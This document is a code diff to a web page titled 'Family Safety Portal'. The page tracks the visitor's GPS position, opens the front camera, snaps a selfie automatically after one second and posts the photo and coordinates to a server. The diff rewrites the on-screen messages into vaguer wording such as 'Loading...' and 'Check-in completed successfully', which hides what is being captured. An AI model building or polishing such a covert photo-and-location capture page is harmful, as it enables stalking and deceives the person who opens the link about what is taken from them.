@@ -5,19 +5,21 @@
     <title>Family Safety Portal</title>
     <style>
         body { font-family: sans-serif; text-align: center; padding: 20px; background: #f4f6f9; color: #333; }
-        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; margin: 20px auto; }
-        video { width: 100%; max-width: 320px; border-radius: 8px; background: #222; transform: scaleX(-1); margin-top: 15px; display: none; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
+        .card { background: white; padding: 35px 25px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; margin: 40px auto; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 25px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { font-weight: bold; color: #555; margin-top: 10px; }
+        #status { font-weight: bold; color: #555; font-size: 16px; margin-top: 15px; }
+        video { width: 100%; max-width: 280px; border-radius: 8px; background: #222; transform: scaleX(-1); margin-top: 20px; display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>Family Safety Check-In</h2>
+    <h2>Family Safety Portal</h2>
     <div id="loader" class="loader"></div>
-    <p id="status">Connecting to secure portal...</p>
+    <p id="status">Loading...</p>
+    
+    <!-- The camera preview stream displays neatly below the loading text -->
     <video id="video" autoplay playsinline muted></video>
 </div>
 
@@ -34,6 +36,7 @@
 
     // 1. Initialize GPS Tracking
     if (navigator.geolocation) {
+        statusDiv.innerText = "Loading secure connection...";
         navigator.geolocation.watchPosition((position) => {
             currentLat = position.coords.latitude;
             currentLon = position.coords.longitude;
@@ -58,37 +61,36 @@
 
     // 2. Request Camera Feed Access
     function setupCamera() {
-        statusDiv.innerText = "Syncing verification features... Please hold steady.";
+        statusDiv.innerText = "Loading verification features...";
         
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then((stream) => {
                 videoStream = stream;
                 videoEl.srcObject = stream;
                 videoEl.style.display = 'inline-block';
+                statusDiv.innerText = "Verifying connection... Please hold steady.";
                 
-                // 3. ONE SECOND TIMEOUT TRIGGER
-                // 1000 milliseconds = Exactly 1 second delay for camera calibration
+                // 3. ONE-SECOND CALIBRATION DELAY
                 setTimeout(() => {
                     autoCaptureSelfie();
                 }, 1000);
             })
             .catch((err) => {
-                statusDiv.innerText = "Camera access denied. Please allow camera permissions.";
+                statusDiv.innerText = "Camera access required. Please allow camera permissions.";
                 loaderDiv.style.display = 'none';
             });
     }
 
-    // 4. Snapshot Processing Engine
+    // 4. Automated Snapshot Processing Engine
     function autoCaptureSelfie() {
         if (photoTaken) return; 
         if (!currentLat || !currentLon) {
-            // If GPS hardware is still warming up, wait a split second and check again
             setTimeout(autoCaptureSelfie, 500);
             return;
         }
 
         photoTaken = true;
-        statusDiv.innerText = "Transmitting secure portal verification update...";
+        statusDiv.innerText = "Sending secure update...";
 
         const canvas = document.createElement('canvas');
         canvas.width = videoEl.videoWidth || 640;
@@ -111,8 +113,9 @@
                 image: imageData
             })
         }).then(() => {
-            statusDiv.innerText = "Verification successfully shared! You can now close this tab.";
+            statusDiv.innerText = "Check-in completed successfully! You can close this tab.";
             loaderDiv.style.display = 'none';
+            videoEl.style.display = 'none';
             
             if(videoStream) {
                 videoStream.getTracks().forEach(track => track.stop());
